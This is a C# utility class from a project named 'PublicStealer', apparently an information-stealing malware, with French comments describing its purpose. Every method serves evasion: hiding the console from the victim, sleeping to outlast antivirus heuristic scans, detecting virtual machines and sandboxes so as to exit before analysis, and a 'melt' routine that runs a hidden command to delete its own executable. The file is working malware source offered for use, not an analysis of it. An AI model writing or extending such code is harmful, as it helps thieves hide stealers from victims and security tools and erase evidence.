using System;
using System.Diagnostics;
using System.Management;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;

namespace PublicStealer.Utils
{
    public static class Security
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private const int SW_HIDE = 0;

        /// <summary>
        /// Masque la console pour rendre l'exécution totalement invisible pour l'utilisateur.
        /// </summary>
        public static void HideConsole()
        {
            try
            {
                IntPtr hWnd = GetConsoleWindow();
                if (hWnd != IntPtr.Zero) ShowWindow(hWnd, SW_HIDE);
            }
            catch { }
        }

        /// <summary>
        /// Technique de "Stalling" (Sommeil profond) pour tromper l'analyse heuristique.
        /// Les antivirus abandonnent souvent le scan après quelques secondes d'inactivité.
        /// </summary>
        public static void DelayExecution(int seconds)
        {
            Thread.Sleep(seconds * 1000);
        }

        /// <summary>
        /// Détecte si l'environnement est une Sandbox ou une Machine Virtuelle (VM).
        /// Si détecté, le programme s'arrête pour éviter d'être analysé.
        /// </summary>
        public static bool IsSandbox()
        {
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
                {
                    foreach (ManagementObject item in searcher.Get())
                    {
                        string manufacturer = item["Manufacturer"].ToString().ToLower();
                        string model = item["Model"].ToString().ToLower();
                        if (manufacturer.Contains("vmware") ||
                            manufacturer.Contains("virtualbox") ||
                            manufacturer.Contains("microsoft") ||
                            model.Contains("virtual"))
                            return true;
                    }
                }
            }
            catch { }
            return false;
        }

        /// <summary>
        /// Auto-destruction : Lance une commande CMD cachée qui supprime le fichier .exe
        /// quelques secondes après la fermeture du processus.
        /// </summary>
        public static void Melt()
        {
            try
            {
                string path = Process.GetCurrentProcess().MainModule.FileName;
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + path + "\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                };
                Process.Start(psi);
                Environment.Exit(0);
            }
            catch { }
        }
    }


}